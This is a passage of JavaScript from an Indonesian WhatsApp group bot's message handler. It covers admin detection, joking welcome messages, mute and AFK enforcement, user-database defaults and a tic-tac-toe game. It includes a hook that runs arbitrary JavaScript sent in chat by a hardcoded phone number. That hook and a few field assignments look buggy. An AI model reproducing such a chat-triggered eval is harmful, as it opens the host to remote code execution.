        const {
          isImage, isVideo, isAudio, isSticker, isQuotedImage, isQuotedVideo,
          isQuotedSticker, isQuotedAudio, isQuotedLocation, isQuotedContact,
          isQuotedDocument, isQuotedViewOnce,
        } = require('./lib/quote-flags').resolve(m)

        
        
        if (!global._gcMetaCache) global._gcMetaCache = {};
        let groupMetadata = '';
        if (m.isGroup) {
            const cached = global._gcMetaCache[m.chat];
            if (cached && (Date.now() - cached.ts) < 120000) {
                groupMetadata = cached.data;
            } else {
                groupMetadata = await alya.groupMetadata(m.chat).catch(e => ({}));
                global._gcMetaCache[m.chat] = { data: groupMetadata, ts: Date.now() };
            }
        }
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? groupMetadata.participants : ''

        if (m.isGroup && m.sender.endsWith("@lid")) {
            m.sender = participants.find(p => p.lid === m.sender)?.jid || m.sender;
        }
        
        
        
        
        
        if (!Ryuu) {
            Ryuu = owner.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
                || (global._supaOwnerCache && global._supaOwnerCache.has(m.sender));
        }
        const groupAdmins = m.isGroup ? participants.filter((v) => v.admin !== null).map((i) => i.jid || i.id) : [];
        
        
        
        
        
        
        
        
        const _groupAdminNums = m.isGroup ? groupAdmins.map(a => (a || '').split('@')[0]) : [];
        const _senderNum = (m.sender || '').split('@')[0];
        
        
        
        
        
        
        const groupOwner = m.isGroup ? (groupMetadata.owner || '') : ''
        const groupMembers = m.isGroup ? (participants || []) : []
        const isBotAdmins = m.isGroup ? (groupAdmins.includes(botNumber) || _groupAdminNums.includes((botNumber || '').split('@')[0])) : false
        const isGroupAdmins = m.isGroup ? (groupAdmins.includes(m.sender) || _groupAdminNums.includes(_senderNum)) : false
    	const isAdmins = m.isGroup ? (groupAdmins.includes(m.sender) || _groupAdminNums.includes(_senderNum)) : false
		const isAdminOrOwner = isAdmins || Ryuu
        const isGroup = m.isGroup 
        const sender = m.sender
        const senderNumber = sender.split('@')[0]

        
        
        
        
        
        
        
        
        
        
        if (isGroup && !m.key.fromMe) {
            try {
                const { isSalamActive, checkAndMarkSalam } = require('./lib/salamuser');
                const _ownerNums = Array.isArray(global.owner) ? global.owner : [];
                const _isBotOwner = _ownerNums.includes(_senderNum);

                if (_isBotOwner && isSalamActive('owner', m.chat)) {
                    
                    if (checkAndMarkSalam('owner', m.chat, sender)) {
                        const _ownerMsg =
`🚨 *SISTEM BOOTING SELESAI - OWNER MASUK* 🚨
_lampu RGB nyala + suara "system online"_

PERHATIAN SELURUH KOMPONEN!!!
DENGAN INI KAMI UMUMKAN:
*SANG PENCIPTA, DEBUGGER, TUHAN SEMESTA GRUP*
*OWNER BOT @${senderNumber} TELAH LOGIN* 👑💻

Kepada seluruh user, member, dan admin harap segera:
1. *RESTART SISTEM*: Kencangkan server, RAM, kuota, dan iman. Aura owner = lag 1 grup
2. *BACKUP DATA*: Sembunyikan bug, aib kode, chat error 404. Owner bisa baca source code hidup kita
3. *UPDATE PATCH*: Siapkan mental, stok kopi, meme, dan tenaga begadang. Bakal ada update fitur "war 8 jam"
4. *MODE AMAN*: Jangan spam command aneh-aneh. 1 salah ketik = di-ban permanen ke dunia nyata

*LEVEL AKSES: ROOT / GOD MODE*
*SKILL OWNER*: 1 perintah = bot nurut. 1 bug = 1 grup panik. 1 update = kita semua re-install kehidupan
*DROP ITEM*: Fitur baru, diskon kuota, traktir... atau error 💀

*PERATURAN DARI OWNER:*
Dilarang nge-hack bot
Dilarang minta fitur "jadi sultan"
Pelanggar akan di-\`!kick\` dari real life

Yang CPU-nya panas silakan cooldown dulu
Yang storage penuh silakan hapus kenangan
Yang lagi kerja silakan \`!afk\`
Yang berani ngetes owner... silakan \`!respawn\` di akhirat

Mari kita sambut bersama:
*"SELAMAT DATANG TUHAN BOT! SEMOGA BOTNYA ANTI LEMOT DAN OWNER NYA ANTI BOKER!"* 🫡🫡

Sekian.
Semoga server kita kuat dan dompet kita gak ke-\`.transfer\``;
                        alya.sendMessage(m.chat, { text: _ownerMsg, mentions: [sender] }).catch(() => {});
                    }
                } else if (isGroupAdmins && isSalamActive('admin', m.chat)) {
                    
                    if (checkAndMarkSalam('admin', m.chat, sender)) {
                        const _adminMsg =
`🚨 *UPACARA PENYAMBUTAN DIMULAI* 🚨
_baris berbaris + musik mars grup_

PERHATIAN PERHATIAN!!!
DENGAN HORMAT KAMI UMUMKAN:
*SANG ADMIN AGUNG @${senderNumber} TELAH HADIR*
*STATUS: ONLINE* 👑💀

Kepada seluruh anggota grup dimohon:
1. *SIKAP SEMPURNA*: Kencangkan ikat pinggang, dompet, dan harga diri. Hormat grak!
2. *LAPORAN KEHADIRAN*: Sembunyikan camilan, kuota, aib, dan chat rahasia. Takut di-razia mendadak
3. *KESIAPSIAGAAN*: Cas mental, powerbank, dan stok meme. Beliau online = ronda malam dimulai
4. *LOYALITAS*: Siapkan tenaga buat begadang, debat, dan ketawa sampe jam 4 pagi

*LEVEL KEKUASAAN: ADMIN MODE*
*SKILL ADMIN*: 1 ketik = grup diem. 1 meme = 1 RT ketawa. 1 kick = kita semua tobat
*EFek SAMPING*: Dompet aman kalau beliau baik hati. Dompet tipis kalau beliau laper

*PERINTAH UPACARA:*
Yang jantung lemah lapor ke medis
Yang kuota 1GB lapor ke WiFi
Yang lagi kerja lapor ke HRD
Yang berani ngebantah... lapor ke malaikat 💀

Demikian upacara penyambutan.
Mari kita sambut dengan riuh:
*"SELAMAT DATANG YANG MULIA ADMIN!!!"* 🫡🫡🫡

Semoga masa jabatan beliau membawa berkah... dan gak bawa sanksi kick`;
                        alya.sendMessage(m.chat, { text: _adminMsg, mentions: [sender] }).catch(() => {});
                    }
                }

                
                if (isSalamActive('user', m.chat)) {
                    const { findRegisteredUser: _findRegUserSalam } = require('./lib/userRegistration')
                    const _regUser = _findRegUserSalam(global.db, sender);
                    if (_regUser && checkAndMarkSalam('user', m.chat, sender)) {
                        const _salamMsg =
`🚨 *STATUS: ONLINE - KODE MERAH DI AKTIFKAN* 🚨

Dengan ini MARKAS BESAR GRUP mengumumkan bahwa @${senderNumber} baru saja terdeteksi *ONLINE*
*KONDISI: SIAGA 1 - DARURAT NASIONAL*

Seluruh anggota harap segera:
1. *KODE 86*: Kencengin ikat pinggang, dompet, harga diri, dan iman. Gocekannya tidak manusiawi
2. *KODE 69*: Sembunyikan camilan, rokok, kopi, kuota, skin ML. Target rawan perampokan digital
3. *KODE 404*: Amankan e-wallet, aib 2019, dan chat sama gebetan. Sistem keamanan jebol kalau dia mulai ngetik
4. *KODE 420*: Siapkan mental baja, stok meme, powerbank, dan pasukan cadangan buat begadang 8 jam nonstop

*LEVEL ANCAMAN: ARMAGEDON*
*DAMPAK*: 1 chat = grup meledak. 1 meme = 1 kecamatan begadang. 1 serius = kita mempertanyakan hidup
*EFEK SAMPING*: Spam stiker, dompet kering, IPK anjlok, tapi mood naik ke stratosfer

*PERINTAH DARI PANGKOM*:
DILARANG DIAJAK DEBAT. DILARANG DIAJAK WAR.
PELANGGAR AKAN DIHUKUM TRAKTIR 1 GRUP

Yang jantung lemah *KODE 911* duduk dulu
Yang kuota 1GB *KODE WIFI* minggir dulu
Yang punya kerjaan *KODE IZIN* pamit dulu
Yang waras *KODE LOKER* taruh dulu

Demikian pengumuman.
Semoga kita selamat sampai kode berubah jadi *KODE HIJAU: DIA OFFLINE* 🫡💀`;
                        alya.sendMessage(m.chat, { text: _salamMsg, mentions: [sender] }).catch(() => {});
                    }
                }
            } catch (e) {
                console.error('[salam] error:', e?.message || e);
            }
        }
        const jangan = m.isGroup ? pler.includes(m.chat) : false
    	const senderJidVariants = [
    	  m.sender,
    	  m.sender.split('@')[0] + '@s.whatsapp.net'  
    	]
    	const isPrem = senderJidVariants.some(jid => prem.includes(jid))
    	const isAly = alys.includes(m.sender)
        const isAlya = alyas.includes(m.sender)
    	const isReseller = resellerp.includes(m.sender)
    	const isAdminP = adminp.includes(m.sender)
    	const isPT = ptp.includes(m.sender)
    	const isOwn = ownp.includes(m.sender)
    	const isUser = alyaverifikasiuser.includes(sender)
    	const mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
        
        
        const mentionByTag = (() => {
          
          if (m.mentionedJid && m.mentionedJid.length > 0) return m.mentionedJid
          
          if (type == 'extendedTextMessage' && m.message?.extendedTextMessage?.contextInfo?.mentionedJid?.length)
            return m.message.extendedTextMessage.contextInfo.mentionedJid
          
          const atMatches = [...(body || '').matchAll(/@(\d{6,15})/g)]
          if (atMatches.length > 0) return atMatches.map(v => v[1] + '@s.whatsapp.net')
          return []
        })()
        const mentionByReply = type == 'extendedTextMessage' && m.message?.extendedTextMessage?.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''
        
        const numberQuery = q.replace(/@/g, '').replace(new RegExp('[()\\-+/ ]', 'gi'), '').trim() + '@s.whatsapp.net'
        const usernya = mentionByReply ? mentionByReply : mentionByTag[0]
        const Input = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false

         
        const resolveTarget = (ctxObj) => {
          const _m   = ctxObj?.m || m
          const _q   = ctxObj?.q ?? q
          const _args = ctxObj?.args ?? args
          
          if (_m.mentionedJid && _m.mentionedJid.length > 0) return _m.mentionedJid[0]
          
          if (_m.quoted?.sender) return _m.quoted.sender
          
          const arg0 = (_args[0] || '').trim()
          const atMatch = arg0.match(/^@?(\d{6,15})$/)
          if (atMatch) return atMatch[1] + '@s.whatsapp.net'
          
          if (arg0.endsWith('@s.whatsapp.net')) return arg0
          
          const qMatch = (_q || '').match(/@?(\d{6,15})/)
          if (qMatch) return qMatch[1] + '@s.whatsapp.net'
          return null
        }
    	const isEval = body.startsWith('=>')
      
      
      
      
      const _openaigcCurrent = Array.isArray(global.openaigc) ? global.openaigc : openaigc
      const isAutoAiGc = m.isGroup ? _openaigcCurrent.includes(m.chat) : true   
      
      
      const _alisagcCurrent = Array.isArray(global.alisagc) ? global.alisagc : alisagc
      const isAutoAiGcAlisa = m.isGroup ? _alisagcCurrent.includes(m.chat) : true  
      const isAlyaChat = m.isGroup ? ChatAlya.includes(m.chat) : true
      const shouldExit = true
      const automati = false
      const cekpesan = true
      
      const _siminyaCurrent = Array.isArray(global.siminya) ? global.siminya : siminya
      const isAutosimi = m.isGroup ? _siminyaCurrent.includes(m.chat) : true    
        const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
        const isAutoSticker = m.isGroup ? autosticker.includes(from) : false
        const antiVirtex = m.isGroup ? ntvirtex.includes(from) : false
        const Antilinkch = m.isGroup ? ntlinkch.includes(m.chat) : false
		const isAntilinkgc2 = m.isGroup ? antilinkgc2[m.chat] : false
        const reactpsn = false
        const AntiLinkYoutubeVid = m.isGroup ? ntilinkytvid.includes(from) : false
        const AntiLinkYoutubeChannel = m.isGroup ? ntilinkytch.includes(from) : false
        
        
        
        
        const isMute = (() => {
            if (!m.isGroup) return false;
            const _now = Date.now();
            if (!global._muteGroupsCache || (_now - global._muteGroupsCache.ts) > 5000) {
                try {
                    global._muteGroupsCache = {
                        data: JSON.parse(fs.readFileSync('./database/mute.json', 'utf8')),
                        ts: _now
                    };
                } catch {
                    global._muteGroupsCache = { data: [], ts: _now };
                }
            }
            return Array.isArray(global._muteGroupsCache.data) && global._muteGroupsCache.data.includes(m.chat);
        })()
        const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(from) : false
        const AntiLinkFacebook = m.isGroup ? ntilinkfb.includes(from) : false
        const AntiLinkTiktok = m.isGroup ? ntilinktt.includes(from) : false
        const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(from) : false
        const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(from) : false
        const AntiLinkAll = m.isGroup ? ntilinkall.includes(from) : false
        const antiWame = m.isGroup ? ntwame.includes(from) : false
const isWelcome = _welcome.includes(m.chat) ? true : false
const isLeft = _left.includes(m.chat) ? true : false
const isSimi = _siminyaCurrent.includes(m.chat) ? true : false  
const isXeonMedia = m.mtype
const rungo = true



let _alyaFiturCache = null;
const alyaFitur = () => {
    if (_alyaFiturCache !== null) return _alyaFiturCache;
    try {
        var mytext = fs.readFileSync('./alya.js').toString();
        _alyaFiturCache = (mytext.match(/case '/g) || []).length;
    } catch {
        _alyaFiturCache = 800; 
    }
    return _alyaFiturCache;
}
        const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const xdate = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
        const time2 = moment.tz('Asia/Jakarta').format('HH : mm : ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
         if(time2 < "23:59:00"){
var AlyaWaktu = `Selamat Malam 🌌`
 }
 if(time2 < "19:00:00"){
var AlyaWaktu = `Selamat Malam 🌃`
 }
 if(time2 < "18:00:00"){
var AlyaWaktu = `Selamat Malam 🌃`
 }
 if(time2 < "15:00:00"){
var AlyaWaktu = `Selamat Sore 🌅`
 }
 if(time2 < "11:00:00"){
var AlyaWaktu = `Selamat pagi 🌄`
 }
 if(time2 < "05:00:00"){
var AlyaWaktu = `Selamat Pagi 🌄`
 } 

let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
var fildt = dt == 'pagi' ? dt + '🌝' : dt == 'siang' ? dt + '🌞' : dt == 'sore' ? dt + '🌝' : dt + '🌚'
const ucapanWaktu = fildt.charAt(0).toUpperCase() + fildt.slice(1)
		if (isEval && senderNumber == "+6285147107037") {
			let evaled,
				text = q,
				{ inspect } = require('util')
			try {
				if (text.endsWith('--sync')) {
					evaled = await eval(l
					)
					reply(evaled)
				}
				evaled = await eval(text)
				if (typeof evaled !== 'string') evaled = inspect(evaled)
			} catch (e) {
				alya.sendMessage(from, { text: String(e) }, { quoted: m })
			}
		}
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = global.db.users[m.sender]
if (typeof user !== 'object') global.db.users[m.sender] = {}
const chats = global.db.chats[m.chat]
if (typeof chats !== 'object') global.db.chats[m.chat] = {

}
if (user) {
if (!isNumber(user.chip)) user.chip = 0
if (!isNumber(user.level)) user.level = 1
if (!isNumber(user.atm)) user.atm = 0
if (!isNumber(user.fullatm)) user.fullatm = 0
if (!isNumber(user.bank)) user.bank = 0
if (!isNumber(user.health)) user.health = 100
if (!isNumber(user.potion)) user.potion = 0
if (!isNumber(user.trash)) user.trash = 0
if (!isNumber(user.wood)) user.wood = 0
if (!isNumber(user.rock)) user.rock = 0
if (!isNumber(user.string)) user.string = 0
if (!isNumber(user.petfood)) user.petfood = 0
if (!isNumber(user.emerald)) user.emerald = 0
if (!isNumber(user.diamond)) user.diamond = 0
if (!isNumber(user.gold)) user.gold = 0
if (!isNumber(user.botol)) user.botol = 0
if (!isNumber(user.kardus)) user.kardus = 0
if (!isNumber(user.kaleng)) user.kaleng = 0
if (!isNumber(user.gelas)) user.gelas = 0
if (!isNumber(user.plastik)) user.plastik = 0
if (!isNumber(user.iron)) user.iron = 0
if (!isNumber(user.common)) user.common = 0
if (!isNumber(user.uncommon)) user.uncommon = 0
if (!isNumber(user.mythic)) user.mythic = 0
if (!isNumber(user.legendary)) user.legendary = 0
if (!isNumber(user.umpan)) user.umpan = 0
if (!isNumber(user.pet)) user.pet = 0
if (!isNumber(user.paus)) user.paus = 0
if (!isNumber(user.kepiting)) user.kepiting = 0
if (!isNumber(user.gurita)) user.gurita = 0
if (!isNumber(user.cumi)) user.cumi = 0
if (!isNumber(user.buntal)) user.buntal = 0
if (!isNumber(user.dory)) user.dory = 0
if (!isNumber(user.lumba)) user.lumba = 0
if (!isNumber(user.lobster)) user.lobster = 0
if (!isNumber(user.hiu)) user.hiu = 0
if (!isNumber(user.udang)) user.udang = 0
if (!isNumber(user.orca)) user.orca = 0
if (!isNumber(user.banteng)) user.banteng = 0
if (!isNumber(user.gajah)) user.gajah = 0
if (!isNumber(user.harimau)) user.harimau = 0
if (!isNumber(user.kambing)) user.kambing = 0
if (!isNumber(user.panda)) user.panda = 0
if (!isNumber(user.buaya)) user.buaya = 0
if (!isNumber(user.kerbau)) user.kerbau = 0
if (!isNumber(user.sapi)) user.sapi = 0
if (!isNumber(user.monyet)) user.monyet = 0
if (!isNumber(user.babihutan)) user.babihutan = 0
if (!isNumber(user.babi)) user.babi = 0
if (!isNumber(user.ayam)) user.ayam = 0
if (!isNumber(user.lastadventure)) user.lastadventure = 0
if (!isNumber(user.lastkill)) user.lastkill = 0
if (!isNumber(user.lastmisi)) user.lastmisi = 0
if (!isNumber(user.lastdungeon)) user.lastdungeon = 0
if (!isNumber(user.lastwar)) user.lastwar = 0
if (!isNumber(user.lastsda)) user.lastsda = 0
if (!isNumber(user.lastduel)) user.lastduel = 0
if (!isNumber(user.lastmining)) user.lastmining = 0
if (!isNumber(user.lasthunt)) user.lasthunt = 0
if (!isNumber(user.lastgift)) user.lastgift = 0
if (!isNumber(user.lastberkebon)) user.lastberkebon = 0
if (!isNumber(user.lastdagang)) user.lastdagang = 0
if (!isNumber(user.lasthourly)) user.lasthourly = 0
if (!isNumber(user.lastbansos)) user.lastbansos = 0
if (!isNumber(user.lastrampok)) user.lastrampok = 0
if (!isNumber(user.lastclaim)) user.lastclaim = 0
if (!isNumber(user.lastnebang)) user.lastnebang = 0
if (!isNumber(user.lastweekly)) user.lastweekly = 0
if (!isNumber(user.lastmonthly)) user.lastmonthly = 0
if (!isNumber(user.apel)) user.apel = 0
if (!isNumber(user.anggur)) user.anggur = 0
if (!isNumber(user.jeruk)) user.jeruk = 0
if (!isNumber(user.mangga)) user.mangga = 0
if (!isNumber(user.pisang)) user.pisang = 0
if (!isNumber(user.makanan)) user.makanan = 0
if (!isNumber(user.bibitanggur)) user.bibitanggur = 0
if (!isNumber(user.bibitpisang)) user.bibitpisang = 0
if (!isNumber(user.bibitapel)) user.bibitapel = 0
if (!isNumber(user.bibitmangga)) user.bibitmangga = 0
if (!isNumber(user.bibitjeruk)) user.bibitjeruk = 0
if (!isNumber(user.horse)) user.horse = 0
if (!isNumber(user.horseexp)) user.horseexp = 0
if (!isNumber(user.cat)) user.cat = 0
if (!isNumber(user.catexp)) user.catexp = 0
if (!isNumber(user.fox)) user.fox = 0
if (!isNumber(user.foxhexp)) user.foxexp = 0
if (!isNumber(user.dog)) user.foxexp = 0
if (!isNumber(user.dogexp)) user.dogexp = 0
if (!isNumber(user.robo)) user.robo = 0
if (!isNumber(user.roboexp)) user.roboexp = 0
if (!isNumber(user.horselastfeed)) user.horselastfeed = 0
if (!isNumber(user.catlastfeed)) user.catlastfeed = 0
if (!isNumber(user.robolastfeed)) user.robolastfeed = 0
if (!isNumber(user.foxlastfeed)) user.foxlastfeed = 0
if (!isNumber(user.doglastfeed)) user.doglastfeed = 0
if (!isNumber(user.robo)) user.robo = 0
if (!isNumber(user.robodurability)) user.robodurability = 0
if (!isNumber(user.armor)) user.armor = 0
if (!isNumber(user.armordurability)) user.armordurability = 0
if (!isNumber(user.sword)) user.sword = 0
if (!isNumber(user.sworddurability)) user.sworddurability = 0
if (!isNumber(user.pickaxe)) user.pickaxe = 1
if (!isNumber(user.pickaxedurability)) user.pickaxedurability = 0
if (!isNumber(user.fishingrod)) user.fishingrod = 0
if (!isNumber(user.fishingroddurability)) user.fishingroddurability = 0
if (!user.premium) user.premiumTime = 0
if (!('afkReason' in user)) user.afkReason = ''
if (!("premium" in user)) user.premium = false
} else global.db.users[m.sender] = {
afkTime: -1,
afkReason: '',
premiumTime: 0,
premium: false,
money: 0,
exp: 0,
level: 0,
limit: 0,
freelimit: 0,
lastclaim: 0,
skata: 0,
registered: false,
name: m.name,
pc: 0,
joinlimit: 1,
age: -1,
regTime: -1,
unreg: false,
afk: -1,
afkReason: '',
banned: false,
bannedTime: 0,
warning: 0,
level: 0,
rokets: 0,
role: 'Pemula',
skill: '',
ojekk: 0,
WarnReason: '',
chip: 0,
bank: 0,
atm: 0,
fullatm: 0,
health: 1000,
potion: 10,
trash: 0,
wood: 0,
rock: 0,
string: 0,
emerald: 0,
diamond: 0,
gold: 0,
iron: 0,
common: 0,
uncommon: 0,
mythic: 0,
legendary: 0,
umpan: 0,
pet: 0,
horse: 0,
horseexp: 0,
horselastfeed: 0,
cat: 0,
catexp: 0,
catlastfeed: 0,
fox: 0,
foxexp: 0,
foxlastfeed: 0,
robo: 0,
roboexp: 0,
robolastfeed: 0,
dog: 0,
dogexp: 0,
doglastfeed: 0,
paus: 0,
kepiting: 0,
gurita: 0,
cumi: 0,
buntal: 0,
dory: 0,
lumba: 0,
lobster: 0,
hiu: 0,
udang: 0,
ikan: 0,
orca: 0,
banteng: 0,
harimau: 0,
gajah: 0,
kambing: 0,
buaya: 0,
kerbau: 0,
sapi: 0,
monyet: 0,
babi: 0,
ayam: 0,
armor: 1,
armordurability: 0,
sword: 1,
sworddurability: 0,
pickaxe: 1,
pickaxedurability: 0,
fishingrod: 0,
fishingroddurability: 0,
robo: 0,
robodurability: 0,
apel: 20,
pisang: 0,
anggur: 0,
mangga: 0,
jeruk: 0,
lastadventure: 0,
lastkill: 0,
lastmisi: 0,
lastdungeon: 0,
lastwar: 0,
lastsda: 0,
lastduel: 0,
lastmining: 0,
lasthunt: 0,
lastgift: 0,
lastberkebon: 0,
lastdagang: 0,
lasthourly: 0,
lastbansos: 0,
lastrampok: 0,
lastclaim: 0,
lastnebang: 0,
lastweekly: 0,
lastmonthly: 0,
chatCount: 0,
}
const setting = db.settings[botNumber]
        if (typeof setting !== 'object') db.settings[botNumber] = {}
	    if (setting) {
    	    if (!('anticall' in setting)) setting.anticall = false
    		if (!isNumber(setting.status)) setting.status = 0
    		if (!('autobio' in setting)) setting.autobio = false
    		if (!('autoread' in setting)) setting.autoread = false
    		if (!('autoreactsw' in setting)) setting.autoreactsw = false
        if (!('goodbye' in setting)) chats.goodbye = setting.auto_leaveMsg
        if (!('onlygrub' in setting)) setting.onlygrub = false
        if (!('onlypc' in setting)) setting.onlypc = false
        if (!('welcome' in setting)) chats.welcome = setting.auto_welcomeMsg
        if (!('whitelistMode' in setting)) setting.whitelistMode = false
        if (!('alyaai_global' in setting)) setting.alyaai_global = true
        if (!('autoblockbot' in setting)) setting.autoblockbot = false
        if (!('public' in setting)) setting.public = true
        
        global.autoblockbot = setting.autoblockbot === true;
        
        
        {
          const _pubSetting = setting.public;
          const _pubGlobal  = global.db?.settings?.[botNumber]?.public;
          
          if (_pubSetting === false || (_pubSetting === undefined && _pubGlobal === false)) {
            alya.public = false;
          } else {
            alya.public = true;
          }
        }
	  } else global.db.settings[botNumber] = {
    	  anticall: false,
    		status: 0,
    		stock:10,
    		autobio: false,
    		autoread: false,
    		auto_ai_grup: true,
    		goodbye: true,
            onlygrub: false,
            onlypc: false,
            welcome: true, 
    		autoread: false,
    		autoreactsw: false,
    		whitelistMode: false,
    		alyaai_global: true,
    		public: true
	    }

} catch (err) {


console.error('[DB Init Error]', err?.message || err)
}


if (m.isGroup && !m.key.fromMe && budy) {
  try {
    groupCtx.logGroupMessage({
      groupId:  m.chat,
      sender:   m.sender,
      pushname: pushname,
      text:     budy,
    });
  } catch (_gcErr) {   }
}





if (m.isGroup && isMute && isCmd) {
    if (!isAdmins && !Ryuu) return
}




if (m.isGroup && !m.key.fromMe && !Ryuu) {
    try {
        
        let _isMuted;
        if (global._muteDB?.isMutedUser) {
            _isMuted = global._muteDB.isMutedUser(m.chat, m.sender);
        } else {
            
            
            
            const _muteDBPath = './database/mute_users.json';
            const _now = Date.now();
            if (!global._muteUsersCache || (_now - global._muteUsersCache.ts) > 10000) {
                try {
                    if (fs.existsSync(_muteDBPath)) {
                        global._muteUsersCache = {
                            data: JSON.parse(fs.readFileSync(_muteDBPath, 'utf8')),
                            ts: _now
                        };
                    } else {
                        global._muteUsersCache = { data: {}, ts: _now };
                    }
                } catch {
                    global._muteUsersCache = { data: {}, ts: _now };
                }
            }
            const _muteData = global._muteUsersCache.data;
            _isMuted = Array.isArray(_muteData[m.chat]) && _muteData[m.chat].includes(m.sender);
        }

        if (_isMuted) {
            
            if (!isAdmins && !Ryuu) {
                
                if (isBotAdmins) {
                    try {
                        await alya.sendMessage(m.chat, { delete: m.key });
                    } catch (e) {
                        if (process.env.NODE_ENV !== 'production')
                            console.warn('[Mute] Gagal hapus pesan:', e.message);
                    }
                }
                return; 
            }
        }
    } catch (e) {
        if (process.env.NODE_ENV !== 'production')
            console.error('[Mute Handler Error]', e.message);
    }
}







if (!alya.public && !Ryuu && !m.key.fromMe) {
    
    
    
    
    
    if (isCmd) {
        return alya.sendMessage(m.chat, {
            text: `⚙️ Bot sedang dalam *mode SELF*.\nHanya owner yang dapat menggunakan bot.`,
            contextInfo: {}
        }, { quoted: m });
    }

    return;
}




if (!Ryuu && !m.key.fromMe && !m.isGroup && db.settings[botNumber]?.onlygrub) {
    return alya.sendMessage(m.chat, {
        text: `Bots sedang dalam Group Only\nSilahkan Bergabung\nhttps://chat.whatsapp.com/LqCKICVcCgiJcrxttSRci3`,
        contextInfo: {}
    }, { quoted: m });
}
if (db.settings[botNumber].autoread) {
            alya.readMessages([m.key])
}

if (process.env.NODE_ENV !== 'production') {
    if (m.message && m.isGroup) {
        console.log(`
┌────────── [ GROUP CHAT LOG ] ──────────┐
│ 🕒 Time      : ${chalk.green(new Date().toISOString().slice(0, 19).replace('T', ' '))}
│ 📝 Message   : ${chalk.blue(budy || m.mtype)}
│ 👤 Sender    : ${chalk.magenta(pushname)} (${chalk.cyan(m.sender)})
│ 🏠 Group     : ${chalk.yellow(groupName)} (${chalk.cyan(m.chat)})
└────────────────────────────────────────┘
    `);
    } else if (m.message) {
        console.log(`
┌───────── [ PRIVATE CHAT LOG ] ─────────┐
│ 🕒 Time      : ${chalk.green(new Date().toISOString().slice(0, 19).replace('T', ' '))}
│ 📝 Message   : ${chalk.blue(budy || m.mtype)}
│ 👤 Sender    : ${chalk.magenta(pushname)} (${chalk.cyan(m.sender)})
└────────────────────────────────────────┘
    `);
    }
}



if (!global.db.settings) global.db.settings = {}
if (botNumber && !global.db.settings[botNumber]) {
    global.db.settings[botNumber] = {
        autoreactsw: false
    }
}
const swSetting = global.db.settings[botNumber]

if (swSetting?.autoreactsw && m.key && m.key.remoteJid === 'status@broadcast') {
    
    const bodyText = (typeof m.body === 'string') ? m.body : '' 
    
    try {
        await alya.readMessages([m.key])
    } catch (e) {
        console.error('Gagal read SW:', e)
    }
    const emoji = ['🔥', '✨', '🙌', '😎', '⭐', '⚡', '💯', '😊', '👍', '🤍', '🤣']
    const randomEmoji = emoji[Math.floor(Math.random() * emoji.length)]
    const participant = m.key.participant || m.participant || m.sender
    
    try {
        await alya.sendMessage('status@broadcast', {
            react: {
                text: randomEmoji,
                key: m.key
            }
        }, { 
            statusJidList: [participant] 
        })
    } catch (err) {
        if (!err.message.includes('media key')) {
            console.error('Error saat auto-react SW:', err.message)
        }
    }
}
if (isCmd && !isUser) {
alyaverifikasiuser.push(sender)
debouncedWrite('./database/user.json', () => alyaverifikasiuser, 3000)
}

alya.sendPresenceUpdate('unavailable', from)

for (let jid of mentionUser) {
    if (m.key.fromMe) continue
    if (jid === m.sender) continue

    let user = global.db.users[jid]
    if (!user) continue
    let afkTime = user.afkTime
    if (!afkTime || afkTime < 0) continue
    let reason = user.afkReason || ''

    let warnInfo = null
    if (m.isGroup && !groupAdmins.includes(m.sender)) {
      warnInfo = addWarn(m.chat, m.sender)
    }

    let warnText = ''
    if (warnInfo) {
      if (warnInfo.kicked) {
        warnText = `\n\n⛔ @${m.sender.split('@')[0]} telah mencapai *${warnInfo.maxWarn}/${warnInfo.maxWarn}* peringatan karena mengganggu user AFK.`
      } else {
        warnText = `\n\n⚠️ @${m.sender.split('@')[0]} mendapat peringatan karena mentag/reply user AFK.\n📊 Warn: *${warnInfo.warnCount}/${warnInfo.maxWarn}*`
      }
    }

    await alya.sendMessage(m.chat, {
      text:
`👤 *${m.pushName || 'Seseorang'}* jangan tag dia!  

📌 Status: *AFK*  
💤 Alasan : ${reason ? reason : '-'}  
⏳ Durasi : ${clockString(new Date - afkTime)}${warnText}

─────────────────────
`.trim(),
      mentions: [...new Set([jid, m.sender])]
    }, { quoted: m })

    if (warnInfo && warnInfo.kicked) {
      if (groupAdmins.includes(botNumber)) {
        await alya.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
      }
    }
}


if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {

            kuis = true

            jawaban = kuismath[m.sender.split('@')[0]]

            if (budy.toLowerCase() == jawaban) {

await reply(`🎮 Kuis Matematika 🎮\tidak ada Jawaban Benar 🎉\dan Mau Main Lagi? Mengirim ${prefix}math mode`)

delete kuismath[m.sender.split('@')[0]]

            } else reply('*Wrong Answer!*')

        }



	    this.game = this.game ? this.game : {}
	    let room13 = Object.values(this.game).find(room13 => room13.id && room13.game && room13.state && room13.id.startsWith('tictactoe') && [room13.game.playerX, room13.game.playerO].includes(m.sender) && room13.state == 'PLAYING')
	    if (room13) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    
	    if (!/^([1-9]|(me)?give up|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room13.game.currentTurn) { 
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room13.game.turn(m.sender === room13.game.playerO, parseInt(m.text) - 1))) {
	    reply({
	    '-3': 'Permainan Telah Berakhir',
	    '-2': 'Tidak sah',
	    '-1': 'Posisi Tidak Valid',
